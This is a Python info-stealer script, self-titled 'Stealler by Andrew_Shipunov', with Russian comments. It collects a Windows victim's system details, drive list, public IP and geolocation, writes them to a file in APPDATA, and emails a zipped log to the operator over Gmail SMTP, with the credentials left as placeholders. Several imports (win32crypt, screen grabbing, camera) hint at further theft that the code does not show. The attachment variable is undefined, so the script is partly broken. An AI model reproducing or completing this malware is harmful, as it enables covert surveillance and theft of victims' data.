import os
from Crypto.Hash import SHA512
import sqlite3
import win32crypt
import email, ssl
import shutil
import requests
import zipfile
import getpass
import ip2geotools
import win32api
import platform
import tempfile
import smtplib
import time
import cv2
import sys
from PIL import ImageGrab
from email.mime.multipart import MIMEMultipart 
from email.mime.base import MIMEBase 
from email.message import Message
from email.mime.multipart import MIMEBase
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate
from email import encoders
from Tools.demo.mcast import sender
from ip2geotools.databases.noncommercial import DbIpCity
from os.path import basename
from smtplib import SMTP
from email.header import Header
from email.utils import parseaddr, formataddr
from base64 import encodebytes
import random
################################################################################
#                              ВСЕ ДАННЫЕ И ЛОКАЦИЯ                            #
################################################################################
drives = str(win32api.GetLogicalDriveStrings())
drives = str(drives.split('\000')[:-1])
response = DbIpCity.get(requests.get("https://ramziv.com/ip").text, api_key='free')
all_data = "Time: " + time.asctime() + '\n' + "Кодировка ФС: " + sys.getfilesystemencoding() + '\n' + "Cpu: " + platform.processor() + '\n' + "Система: " + platform.system() + ' ' + platform.release() + '\nIP: '+requests.get("https://ramziv.com/ip").text+'\nГород: '+response.city+'\nGen_Location:' + response.to_json() + '\nДиски:' + drives
file = open(os.getenv("APPDATA") + '\\alldata.txt', "w+") 
file.write(all_data)
file.close()
################################################################################
#                              ОТПРАВКА                                        #
################################################################################
'↑Stealler by Andrew_Shipunov↑'.encode('utf-8')
msgtext = MIMEText('↑Stealler by Andrew_Shipunov↑'.encode('utf-8'), 'plain', 'utf-8')
msg = MIMEMultipart()
msg['From'] = 'ваша новая почта@gmail.com'
msg['To'] = 'почта куда отправится'
msg['Subject'] = getpass.getuser() + '-PC'
msg.attach(msgtext)
################################################################################
#                              СОЗДАНИЕ ВЛОЖЕНИЯ                               #
################################################################################
part = MIMEBase('application', "zip")
b = open(doc, "rb").read()
bs = encodebytes(b).decode()
part.set_payload(bs)
part.add_header('Content-Transfer-Encoding', 'base64')
part.add_header('Content-Disposition', 'attachment; filename="LOG.zip"')
msg.attach(part)
################################################################################
#                              ОТПРАВКА вам       #
################################################################################
s = smtplib.SMTP('smtp.gmail.com', 587)
s.starttls()                                   
s.login('новая ваша почта гмаил', 'пароль от новой почты гмаил')
s.sendmail('новая ваша почта гмаил', 'почта куда отправится', msg.as_string())
s.quit()
i = input()
